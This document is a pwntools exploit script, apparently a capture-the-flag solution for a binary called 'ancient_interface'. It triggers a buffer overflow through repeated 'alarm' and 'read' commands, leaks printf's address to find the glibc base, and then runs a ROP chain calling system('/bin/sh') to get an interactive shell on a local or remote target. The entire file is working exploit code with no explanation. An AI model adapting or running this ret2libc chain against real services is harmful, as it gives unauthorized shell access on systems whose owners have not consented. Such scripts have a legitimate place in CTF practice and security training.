#!/usr/bin/env python3

from pwn import context, ELF, p64, remote, ROP, sleep, sys, u64


context.log_level = 'DEBUG'
context.binary = elf = ELF('challenge/ancient_interface')
glibc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

PROMPT = b'user@host$ '


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def send_payload(payload: bytes):
    for _ in range(48):
        p.sendlineafter(PROMPT, b'alarm 2')

    p.sendlineafter(PROMPT, b'read 8 q')
    sleep(3)

    p.sendline(payload.ljust(8 + 48, b'A'))


def main():
    rop = ROP(elf)

    payload  = b'A' * 8
    payload += p64(rop.rdi.address)
    payload += p64(elf.got.printf)
    payload += p64(elf.plt.puts)
    payload += p64(0x401290)

    send_payload(payload)

    printf_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))
    p.info(f'Leaked printf() address: {hex(printf_addr)}')

    glibc.address = printf_addr - glibc.sym.printf
    p.success(f'Glibc base address: {hex(glibc.address)}')

    payload  = b'A' * 8
    payload += p64(rop.rdi.address)
    payload += p64(next(glibc.search(b'/bin/sh')))
    payload += p64(rop.ret.address)
    payload += p64(glibc.sym.system)

    send_payload(payload)

    p.interactive()


if __name__ == '__main__':
    p = get_process()
    main()
